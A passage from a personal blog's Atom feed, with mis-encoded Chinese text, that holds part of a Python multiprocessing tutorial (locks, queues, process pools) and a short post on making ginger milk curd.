class="line">Array at end: [<span class="number">134.0</span>, <span class="number">237.0</span>, <span class="number">339.0</span>]</span><br><span class="line">end main</span><br></pre></td></tr></table></figure><h3><span id="ru-he-shi-yong-suo">å¦‚ä½•ä½¿ç”¨é”</span></h3><p>è¯·æ³¨æ„ï¼Œåœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œä¸¤ä¸ªè¿›ç¨‹åº”å°†å…±äº«å€¼å¢åŠ 1è¾¾100æ¬¡ã€‚ è¿™æ ·ä¸€æ¥ï¼Œæ€»å…±è¿›è¡Œäº†200æ¬¡æ“ä½œã€‚ ä½†æ˜¯ä¸ºä»€ä¹ˆç»ˆå€¼ä¸æ˜¯200ï¼Ÿ</p><h3><span id="jing-tai-tiao-jian">ç«æ€æ¡ä»¶</span></h3><p>è¿™é‡Œå‘ç”Ÿäº†ç«æ€æƒ…å†µã€‚å½“ä¸¤ä¸ªæˆ–å¤šä¸ªè¿›ç¨‹æˆ–çº¿ç¨‹å¯ä»¥è®¿é—®å…±äº«æ•°æ®å¹¶ä¸”å®ƒä»¬è¯•å›¾åŒæ—¶æ›´æ”¹å®ƒä»¬æ—¶ï¼Œå°±ä¼šå‘ç”Ÿç«æ€æƒ…å†µã€‚åœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­ï¼Œä¸¤ä¸ªè¿›ç¨‹å¿…é¡»è¯»å–å…±äº«å€¼ï¼Œå°†å…¶å¢åŠ 1ï¼Œç„¶åå°†å…¶å†™å›åˆ°å…±äº«å˜é‡ä¸­ã€‚å¦‚æœè¿™åŒæ—¶å‘ç”Ÿï¼Œåˆ™ä¸¤ä¸ªè¿›ç¨‹å°†è¯»å–ç›¸åŒçš„å€¼ï¼Œå°†å…¶å¢åŠ å¹¶å†™å›ã€‚å› æ­¤ï¼Œä¸¤ä¸ªè¿›ç¨‹éƒ½å°†ç›¸åŒçš„å¢åŠ çš„å€¼å†™å›åˆ°å…±äº«å¯¹è±¡ä¸­ï¼Œå¹¶ä¸”è¯¥å€¼æœªå¢åŠ 2ã€‚æœ‰å…³ç«æ€æ¡ä»¶çš„è¯¦ç»†è¯´æ˜ï¼Œè¯·å‚è§ <a href="https://www.notion.so/16-Python-1d15878dedcd42f18eed31799af94980">16. å¤šçº¿ç¨‹ â€” Python è¿›é˜¶</a> ã€‚</p><h3><span id="bi-mian-dai-suo-de-jing-tai-tiao-jian">é¿å…å¸¦é”çš„ç«æ€æ¡ä»¶</span></h3><p>é”ï¼ˆä¹Ÿç§°ä¸ºäº’æ–¥é”ï¼‰æ˜¯ä¸€ç§åŒæ­¥æœºåˆ¶ï¼Œç”¨äºåœ¨å­˜åœ¨è®¸å¤šæ‰§è¡Œè¿›ç¨‹/çº¿ç¨‹çš„ç¯å¢ƒä¸­å¼ºåˆ¶é™åˆ¶å¯¹èµ„æºçš„è®¿é—®ã€‚é”å…·æœ‰ä¸¤ç§çŠ¶æ€ï¼šé”å®šå’Œè§£é”ã€‚å¦‚æœçŠ¶æ€ä¸ºé”å®šï¼Œåˆ™åœ¨çŠ¶æ€å†æ¬¡è¢«è§£é”ä¹‹å‰ï¼Œä¸å…è®¸å…¶ä»–å¹¶å‘è¿›ç¨‹/çº¿ç¨‹è¿›å…¥æ­¤ä»£ç æ®µã€‚</p><p>ä¸¤ä¸ªå‡½æ•°å¾ˆé‡è¦ï¼š</p><ul><li><code>lock.acquire()</code>ï¼šè¿™å°†é”å®šçŠ¶æ€å¹¶é˜»å¡</li><li><code>lock.release()</code>ï¼šè¿™å°†å†æ¬¡è§£é”çŠ¶æ€ã€‚</li></ul><p>é‡è¦æç¤ºï¼šå—è·å¾—åï¼Œä½ åº”å§‹ç»ˆå†æ¬¡é‡Šæ”¾å®ƒï¼</p><p>åœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­ï¼Œè¯»å–å¹¶å¢åŠ äº†å…±äº«å˜é‡çš„å…³é”®ä»£ç éƒ¨åˆ†ç°å·²é”å®šã€‚è¿™æ ·å¯ä»¥é˜²æ­¢ç¬¬äºŒä¸ªè¿›ç¨‹åŒæ—¶ä¿®æ”¹å…±äº«åº“ã€‚æˆ‘ä»¬çš„ä»£ç æ²¡æœ‰å¤ªå¤§å˜åŒ–ã€‚æ‰€æœ‰æ–°æ›´æ”¹éƒ½åœ¨ä¸‹é¢çš„ä»£ç ä¸­è¿›è¡Œäº†æ³¨é‡Šã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># import Lock</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Lock</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Value, Array</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_100</span>(<span class="params">number, lock</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br><span class="line">        <span class="comment"># lock the state</span></span><br><span class="line">        lock.acquire()</span><br><span class="line">        </span><br><span class="line">        number.value += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># è§£é”çŠ¶æ€</span></span><br><span class="line">        lock.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_100_array</span>(<span class="params">numbers, lock</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(numbers)):</span><br><span class="line">            lock.acquire()</span><br><span class="line">            numbers[i] += <span class="number">1</span></span><br><span class="line">            lock.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆ›å»ºé”</span></span><br><span class="line">    lock = Lock()</span><br><span class="line">    </span><br><span class="line">    shared_number = Value(<span class="string">&#x27;i&#x27;</span>, <span class="number">0</span>) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Value at beginning:&#x27;</span>, shared_number.value)</span><br><span class="line"></span><br><span class="line">    shared_array = Array(<span class="string">&#x27;d&#x27;</span>, [<span class="number">0.0</span>, <span class="number">100.0</span>, <span class="number">200.0</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Array at beginning:&#x27;</span>, shared_array[:])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†é”ä¼ å…¥ç›®æ ‡å‡½æ•°</span></span><br><span class="line">    process1 = Process(target=add_100, args=(shared_number, lock))</span><br><span class="line">    process2 = Process(target=add_100, args=(shared_number, lock))</span><br><span class="line"></span><br><span class="line">    process3 = Process(target=add_100_array, args=(shared_array, lock))</span><br><span class="line">    process4 = Process(target=add_100_array, args=(shared_array, lock))</span><br><span class="line"></span><br><span class="line">    process1.start()</span><br><span class="line">    process2.start()</span><br><span class="line">    process3.start()</span><br><span class="line">    process4.start()</span><br><span class="line"></span><br><span class="line">    process1.join()</span><br><span class="line">    process2.join()</span><br><span class="line">    process3.join()</span><br><span class="line">    process4.join()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Value at end:&#x27;</span>, shared_number.value)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Array at end:&#x27;</span>, shared_array[:])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end main&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Value at beginning: <span class="number">0</span></span><br><span class="line">Array at beginning: [<span class="number">0.0</span>, <span class="number">100.0</span>, <span class="number">200.0</span>]</span><br><span class="line">Value at end: <span class="number">200</span></span><br><span class="line">Array at end: [<span class="number">200.0</span>, <span class="number">300.0</span>, <span class="number">400.0</span>]</span><br><span class="line">end main</span><br></pre></td></tr></table></figure><h3><span id="shi-yong-suo-zuo-wei-shang-xia-wen-guan-li-qi">ä½¿ç”¨é”ä½œä¸ºä¸Šä¸‹æ–‡ç®¡ç†å™¨</span></h3><p>åœ¨ <code>lock.acquire()</code> ä¹‹åï¼Œä½ åº”è¯¥æ°¸è¿œä¸è¦å¿˜è®°è°ƒç”¨ <code>lock.release()</code> æ¥è§£é”ä»£ç ã€‚ ä½ è¿˜å¯ä»¥å°†é”ç”¨ä½œä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼Œè¿™å°†å®‰å…¨åœ°é”å®šå’Œè§£é”ä½ çš„ä»£ç ã€‚ å»ºè®®ä»¥è¿™ç§æ–¹å¼ä½¿ç”¨é”ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_100</span>(<span class="params">number, lock</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br><span class="line">        <span class="keyword">with</span> lock:</span><br><span class="line">            number.value += <span class="number">1</span></span><br></pre></td></tr></table></figure><h3><span id="zai-python-zhong-shi-yong-dui-lie">åœ¨Pythonä¸­ä½¿ç”¨é˜Ÿåˆ—</span></h3><p>æ•°æ®ä¹Ÿå¯ä»¥é€šè¿‡é˜Ÿåˆ—åœ¨è¿›ç¨‹ä¹‹é—´å…±äº«ã€‚ é˜Ÿåˆ—å¯ç”¨äºå¤šçº¿ç¨‹å’Œå¤šè¿›ç¨‹ç¯å¢ƒä¸­çš„çº¿ç¨‹å®‰å…¨/è¿›ç¨‹å®‰å…¨æ•°æ®äº¤æ¢å’Œæ•°æ®å¤„ç†ï¼Œè¿™æ„å‘³ç€ä½ å¯ä»¥é¿å…ä½¿ç”¨ä»»ä½•åŒæ­¥åŸè¯­ï¼ˆä¾‹å¦‚é”ï¼‰ã€‚</p><p>é˜Ÿåˆ—é˜Ÿåˆ—æ˜¯éµå¾ªå…ˆè¿›å…ˆå‡ºï¼ˆFIFOï¼‰åŸç†çš„çº¿æ€§æ•°æ®ç»“æ„ã€‚ ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­æ˜¯æ’é˜Ÿç­‰å€™çš„å®¢æˆ·é˜Ÿåˆ—ï¼Œå…¶ä¸­é¦–å…ˆæœåŠ¡çš„æ˜¯ç¬¬ä¸€ä½çš„å®¢æˆ·ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºé˜Ÿåˆ—</span></span><br><span class="line">q = Queue()</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ·»åŠ å…ƒç´ </span></span><br><span class="line">q.put(<span class="number">1</span>) <span class="comment"># 1</span></span><br><span class="line">q.put(<span class="number">2</span>) <span class="comment"># 2 1</span></span><br><span class="line">q.put(<span class="number">3</span>) <span class="comment"># 3 2 1 </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç°åœ¨ q çœ‹èµ·æ¥æ˜¯è¿™æ ·çš„:</span></span><br><span class="line"><span class="comment"># back --&gt; 3 2 1 --&gt; front</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å’Œç§»é™¤ç¬¬ä¸€ä¸ªå…ƒç´ </span></span><br><span class="line">first = q.get() <span class="comment"># --&gt; 1</span></span><br><span class="line"><span class="built_in">print</span>(first) </span><br><span class="line"></span><br><span class="line"><span class="comment"># q ç°åœ¨çœ‹èµ·æ¥æ˜¯è¿™æ ·çš„:</span></span><br><span class="line"><span class="comment"># back --&gt; 3 2 --&gt; front</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><h3><span id="zai-duo-jin-cheng-zhong-shi-yong-dui-lie">åœ¨å¤šè¿›ç¨‹ä¸­ä½¿ç”¨é˜Ÿåˆ—</span></h3><p>å¸¦æœ‰é˜Ÿåˆ—çš„æ“ä½œæ˜¯è¿›ç¨‹å®‰å…¨çš„ã€‚ é™¤äº† <code>task_done()</code> å’Œ <code>join()</code> ä¹‹å¤–ï¼Œå¤šè¿›ç¨‹é˜Ÿåˆ—å®ç°äº† <code>queue.Queue</code> çš„æ‰€æœ‰æ–¹æ³•ã€‚ é‡è¦æ–¹æ³•æ˜¯ï¼š</p><ul><li><code>q.get()</code>ï¼šåˆ é™¤å¹¶è¿”å›ç¬¬ä¸€é¡¹ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒä¼šé˜»å¡ï¼Œç›´åˆ°è¯¥é¡¹å¯ç”¨ä¸ºæ­¢ã€‚</li><li><code>q.put(item)</code>ï¼šå°†å…ƒç´ æ”¾åœ¨é˜Ÿåˆ—çš„æœ«å°¾ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒä¼šé˜»å¡ï¼Œç›´åˆ°æœ‰ç©ºé—²æ’æ§½å¯ç”¨ä¸ºæ­¢ã€‚</li><li><code>q.empty()</code>ï¼šå¦‚æœé˜Ÿåˆ—ä¸ºç©ºï¼Œåˆ™è¿”å›Trueã€‚</li><li><code>q.close()</code>ï¼šæŒ‡ç¤ºå½“å‰è¿›ç¨‹ä¸ä¼šå†å°†æ›´å¤šæ•°æ®æ”¾å…¥æ­¤é˜Ÿåˆ—ã€‚</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨å¤šè¿›ç¨‹é˜Ÿåˆ—åœ¨è¿›ç¨‹ä¹‹é—´è¿›è¡Œé€šä¿¡</span></span><br><span class="line"><span class="comment"># é˜Ÿåˆ—æ˜¯çº¿ç¨‹å’Œè¿›ç¨‹å®‰å…¨çš„</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Queue</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">square</span>(<span class="params">numbers, queue</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> numbers:</span><br><span class="line">        queue.put(i*i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_negative</span>(<span class="params">numbers, queue</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> numbers:</span><br><span class="line">        queue.put(i*-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    </span><br><span class="line">    numbers = <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>)</span><br><span class="line">    q = Queue()</span><br><span class="line"></span><br><span class="line">    p1 = Process(target=square, args=(numbers,q))</span><br><span class="line">    p2 = Process(target=make_negative, args=(numbers,q))</span><br><span class="line"></span><br><span class="line">    p1.start()</span><br><span class="line">    p2.start()</span><br><span class="line"></span><br><span class="line">    p1.join()</span><br><span class="line">    p2.join()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># é¡ºåºå¯èƒ½ä¸æ˜¯æŒ‰åºåˆ—çš„</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> q.empty():</span><br><span class="line">        <span class="built_in">print</span>(q.get())</span><br><span class="line">        </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end main&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">16</span></span><br><span class="line"><span class="number">25</span></span><br><span class="line">-<span class="number">1</span></span><br><span class="line">-<span class="number">2</span></span><br><span class="line">-<span class="number">3</span></span><br><span class="line">-<span class="number">4</span></span><br><span class="line">-<span class="number">5</span></span><br><span class="line">end main</span><br></pre></td></tr></table></figure><h3><span id="jin-cheng-chi">è¿›ç¨‹æ± </span></h3><p>è¿›ç¨‹æ± å¯¹è±¡æ§åˆ¶å¯ä»¥å‘å…¶æäº¤ä½œä¸šçš„å·¥ä½œè¿›ç¨‹æ± ã€‚å®ƒæ”¯æŒå¸¦æœ‰è¶…æ—¶å’Œå›è°ƒçš„å¼‚æ­¥ç»“æœï¼Œå¹¶å…·æœ‰å¹¶è¡Œæ˜ å°„å®ç°ã€‚å®ƒå¯ä»¥è‡ªåŠ¨ç®¡ç†å¯ç”¨çš„å¤„ç†å™¨ï¼Œå¹¶å°†æ•°æ®æ‹†åˆ†ä¸ºè¾ƒå°çš„å—ï¼Œç„¶åç”±ä¸åŒçš„è¿›ç¨‹å¹¶è¡Œå¤„ç†ã€‚æœ‰å…³æ‰€æœ‰å¯èƒ½çš„æ–¹æ³•ï¼Œè¯·å‚è§ <a href="https://docs.python.org/3.7/library/multiprocessing.html#multiprocessing.pool">https://docs.python.org/3.7/library/multiprocessing.html#multiprocessing.pool</a>ã€‚é‡è¦æ–¹æ³•æœ‰</p><ul><li><code>map(func, iterable[, chunksize])</code>ï¼šæ­¤æ–¹æ³•å°† Iterable åˆ†æˆè®¸å¤šå—ï¼Œä½œä¸ºå•ç‹¬çš„ä»»åŠ¡æäº¤ç»™è¿›ç¨‹æ± ã€‚è¿™äº›å—çš„ï¼ˆå¤§çº¦ï¼‰å¤§å°å¯ä»¥é€šè¿‡å°† chunksize è®¾ç½®ä¸ºæ­£æ•´æ•°æ¥æŒ‡å®šã€‚å®ƒä¼šé˜»å¡ï¼Œç›´åˆ°ç»“æœå‡†å¤‡å¥½ä¸ºæ­¢ã€‚</li><li><code>close()</code>ï¼šé˜»æ­¢å°†æ›´å¤šä»»åŠ¡æäº¤åˆ°æ± ä¸­ã€‚ä¸€æ—¦å®Œæˆæ‰€æœ‰ä»»åŠ¡ï¼Œå·¥ä½œè¿›ç¨‹å°†é€€å‡ºã€‚</li><li><code>join()</code>ï¼šç­‰å¾…å·¥ä½œè¿›ç¨‹é€€å‡ºã€‚ä½¿ç”¨ <code>join()</code> ä¹‹å‰ï¼Œå¿…é¡»å…ˆè°ƒç”¨ <code>close()</code> æˆ– <code>terminate()</code>ã€‚</li><li><code>apply(func, args)</code>ï¼šä½¿ç”¨å‚æ•°argsè°ƒç”¨funcã€‚å®ƒä¼šé˜»å¡ï¼Œç›´åˆ°ç»“æœå‡†å¤‡å¥½ä¸ºæ­¢ã€‚ funcä»…åœ¨æ± çš„ä¸€ä¸ªå·¥ä½œç¨‹åºä¸­æ‰§è¡Œã€‚</li></ul><p>æ³¨æ„ï¼šä¹Ÿæœ‰ä¸ä¼šé˜»å¡çš„å¼‚æ­¥å˜ä½“ <code>map_async()</code> å’Œ <code>apply_async()</code>ã€‚ç»“æœå‡†å¤‡å¥½åï¼Œä»–ä»¬å¯ä»¥æ‰§è¡Œå›è°ƒã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cube</span>(<span class="params">number</span>):</span><br><span class="line">    <span class="keyword">return</span> number * number * number</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    numbers = <span class="built_in">range</span>(<span class="number">10</span>)</span><br><span class="line">    </span><br><span class="line">    p = Pool()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™å°†åˆ†é…æ­¤ä»»åŠ¡çš„æœ€å¤§å¯ç”¨å¤„ç†å™¨æ•° --&gt; os.cpu_count()</span></span><br><span class="line">    result = p.<span class="built_in">map</span>(cube,  numbers)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># or </span></span><br><span class="line">    <span class="comment"># result = [p.apply(cube, args=(i,)) for i in numbers]</span></span><br><span class="line">    </span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">27</span>, <span class="number">64</span>, <span class="number">125</span>, <span class="number">216</span>, <span class="number">343</span>, <span class="number">512</span>, <span class="number">729</span>]</span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      17. å¤šè¿›ç¨‹ â€” Python è¿›é˜¶
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>å§œæ±æ’å¥¶å°è®°</title>
    <link href="https://qiwihui.com/qiwihui-blog-72/"/>
    <id>https://qiwihui.com/qiwihui-blog-72/</id>
    <published>2022-08-13T01:54:25.500Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸Šå‘¨é™ªç€çœ‹ã€Šå‘å¾€çš„ç”Ÿæ´»ã€‹ï¼Œé»„ç£Šåœ¨èŠ‚ç›®ä¸­ç»™å¤§å®¶åšäº†ä¸€æ¬¡å§œæ±æ’å¥¶ï¼Œçœ‹ç€å¤§å®¶éƒ½åƒå¾—éƒ½å¼€äº†èŠ±ä¼¼çš„ï¼Œäºæ˜¯å†³å®šæˆ‘ä¹Ÿè¦åšä¸€æ¬¡ã€‚</p><h2><span id="1-0-ban-ben">1.0ç‰ˆæœ¬</span></h2><p>åœ¨è¶…å¸‚ä¹°èœçš„æ—¶å€™éšæ‰‹ä¹°äº†ç”Ÿå§œå’Œç‰›å¥¶ï¼Œå›åˆ°å®¶æ”¾è¿›å†°ç®±ä¹Ÿå°±å¿˜äº†ã€‚æ˜¨å¤©æƒ³èµ·æ¥å¼€å§‹åšæ—¶å·²ç»è¿‡äº†äº”å¤©äº†ï¼Œå¼€å§‹ç¬¬ä¸€æ¬¡å°è¯•ã€‚é¦–å…ˆæŠŠç”Ÿå§œåˆ‡æˆå°å—ï¼Œæ”¾ç¢—é‡Œç”¨æ“€é¢æ–æ£ç¢äº†ï¼Œå› ä¸ºç”Ÿå§œæœ‰ç‚¹å¹²äº†ï¼ŒåŠ äº†ç‚¹æ°´æŒ¤å‡ºæ¥å°åŠç¢—å§œæ±ï¼Œç„¶åæŠŠç‰›å¥¶åŠ å…¥ç™½ç³–ç…®å¼€äº†ï¼Œå€’å…¥è£…å§œæ±çš„ç¢—ä¸­ï¼Œç„¶åå°†ç¢—ä¸­çš„æ’å¥¶æ”¾åˆ°é”…ä¸Šè’¸äº†äº”åˆ†é’Ÿã€‚ä½†æ˜¯ï¼Œç»“æœå¹¶æ²¡æœ‰åƒç”µè§†ä¸Šé‚£æ ·å¥½ï¼Œç‰›å¥¶è¿˜æ˜¯ç‰›å¥¶ï¼ŒåŠ äº†å§œæ±å’Œç³–çš„ç‰›å¥¶ã€‚ä¸ºä»€ä¹ˆä¼šå¤±è´¥å‘¢ï¼Ÿ</p><p>è®¤çœŸåˆ†æäº†ä¸€ä¸‹åŸå› ï¼Œæˆ‘æƒ³å¤§æ¦‚æ˜¯æ˜¯è¿™æ ·çš„ï¼šå§œæ±æ’å¥¶çš„è¿‡ç¨‹å°±æ˜¯è›‹ç™½è´¨å˜æ€§çš„è¿‡ç¨‹ï¼Œç‰›å¥¶ä¸­çš„è›‹ç™½è´¨å’Œå§œæ±ä¸­çš„æŸäº›ç‰©è´¨æ··åˆå¯¼è‡´è›‹ç™½è´¨å˜æ€§ï¼Œå’Œåšè±†è…è„‘çš„è¿‡ç¨‹å·®ä¸å¤šï¼Œä½†æ˜¯å› ä¸ºåŸæ–™çš„å“è´¨æ²¡æœ‰è¾¾åˆ°å˜æ€§çš„è¦æ±‚ï¼š</p><ol><li>ç”Ÿå§œæ”¾ç€å·²ç»å˜å¹²äº†ï¼Œæ²¡æœ‰ä»€ä¹ˆæ±æ°´ï¼Œæˆ‘åˆåŠ äº†æ°´ï¼Œå¯¼è‡´å§œæ±çš„æµ“åº¦ä¸å¤Ÿï¼›</li><li>ç‰›å¥¶çš„ä¿è´¨æœŸæ˜¯8å¤©ï¼ŒåŠ ä¸Šæ”¾ç½®çš„å‡ å¤©ï¼ŒåŸºæœ¬ä¹Ÿå°±æ˜¯å˜è´¨å‰ä¸€å¤©æ‰ç”¨ï¼Œè¿™æ˜¯è›‹ç™½è´¨å·²ç»å‘ç”Ÿäº†ä¸€äº›å˜åŒ–ï¼Œä»æˆ‘ä¹‹åä¹°çš„æ–°é²œçš„ç‰›å¥¶çš„å¯¹æ¯”å¯ä»¥çœ‹å‡ºè¿™æ—¶çš„ç‰›å¥¶å·²ç»æœ‰äº›å˜æµ‘äº†ï¼Œè€Œä¸”å¯èƒ½ç‰›å¥¶ä¸æ˜¯å…¨è„‚çš„ï¼Œè›‹ç™½è´¨æµ“åº¦ä¸é«˜ï¼›</li><li>å§œæ±å’Œç‰›å¥¶æ··åˆä¹‹åæ”¾é”…ä¸Šè’¸å…¶å®æ˜¯ä¸ºäº†ä¿æ¸©ï¼Œä½†æ˜¯åŠ çƒ­æ²¸è…¾ä¼šä½¿æœ€åå˜æ€§çš„è¿‡ç¨‹è¢«ç ´åï¼Œæ²¡æ³•å‡æˆè±†è…è„‘é‚£æ ·ã€‚</li></ol><p>åŸºäºä»¥ä¸Šçš„åˆ†æï¼Œæˆ‘å†³å®šå†è¯•ä¸€æ¬¡ã€‚</p><span id="more"></span><h2><span id="2-0-ban-ben">2.0ç‰ˆæœ¬</span></h2><p>é¦–å…ˆé€‰æï¼Œç”Ÿå§œé€‰è€ä¸€äº›çš„ï¼Œè¿™æ ·æ˜¯è›‹ç™½è´¨å˜æ€§çš„ç‰©è´¨å«é‡é«˜ï¼Œç‰›å¥¶é€‰å…¨è„‚çš„ï¼Œè›‹ç™½è´¨å«é‡é«˜ã€‚å…¶æ¬¡ï¼Œåšæ³•ä¸Šï¼Œç”Ÿå§œç”¨æ¿å­ç£¨æˆæœ«æŒ¤å§œæ±æ°´ï¼Œç‰›å¥¶ç…®çš„æ—¶å€™ç…®åˆ°å¿«å¼€å†å…³ç«ç­‰10ç§’ï¼Œè¿™æ ·å¤§æ¦‚å°±æ˜¯80åº¦ï¼Œç„¶åä¸å§œæ±æ··åˆã€‚æ··åˆçš„æ—¶å€™æŠŠå§œæ±åˆ†æˆäº†ä¸¤ä¸ªç¢—ï¼Œæ¯ä¸ªç¢—å€’å…¥åŸæ¥ä¸€èˆ¬çš„ç‰›å¥¶ï¼Œè¿™æ ·å°±æ¯”ä¹‹å‰æ›´å¥½æ§åˆ¶ã€‚æ··åˆä¹‹åä¸æ…åŠ¨ï¼Œå¹¶ç”¨ç›˜å­ç›–ä½ä¿æŒæ¸©åº¦ï¼Œç­‰10åˆ†é’Ÿå·¦å³ã€‚</p><p>ç»è¿‡è¿™äº›æ”¹è¿›ï¼Œæˆ‘ç»ˆäºå¾—åˆ°äº†å½¢ä¼¼è±†è…è„‘çš„å§œæ±è£…å¥¶ï¼è™½ç„¶æ²¡æœ‰æŠŠæ¡å¥½ç³–çš„é‡ä½¿å¾—ç‰›å¥¶æœ‰äº›æ·¡ï¼Œä½†2.0ç‰ˆæœ¬å‘³é“ç¡®å®ä¸é”™ã€‚</p><img width="367" alt="ginger_milk" src="https://user-images.githubusercontent.com/3297411/57985140-3ab2f300-7a96-11e9-887a-a5ffed954da9.png"><h2><span id="zong-jie">æ€»ç»“</span></h2><p>åšä¸€ä»¶äº‹è¦äº†è§£åŸç†ï¼ŒæŒæ¡æ¯ä¸€æ­¥çš„æŠ€æœ¯ç»†èŠ‚å’Œå¯¹ç»“æœçš„å½±å“ï¼Œè¿™æ ·æ‰èƒ½åšå¥½ä¸€ä»¶äº‹ï¼è¿™å°±æ˜¯ä¸¤æ¬¡å§œæ±æ’å¥¶çš„æ€»ç»“ã€‚</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      å§œæ±æ’å¥¶å°è®°
    
    </summary>
    
    
      <category term="ç”Ÿæ´»" scheme="https://qiwihui.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>å­¦ä¹ Djangoâ”€â”€æˆ‘çŠ¯çš„åˆå­¦è€…é”™è¯¯ä»¥åŠå¦‚ä½•é¿å…</title>
    <link href="https://qiwihui.com/qiwihui-blog-81/"/>
    <id>https://qiwihui.com/qiwihui-blog-81/</id>
    <published>2022-08-13T01:54:25.500Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
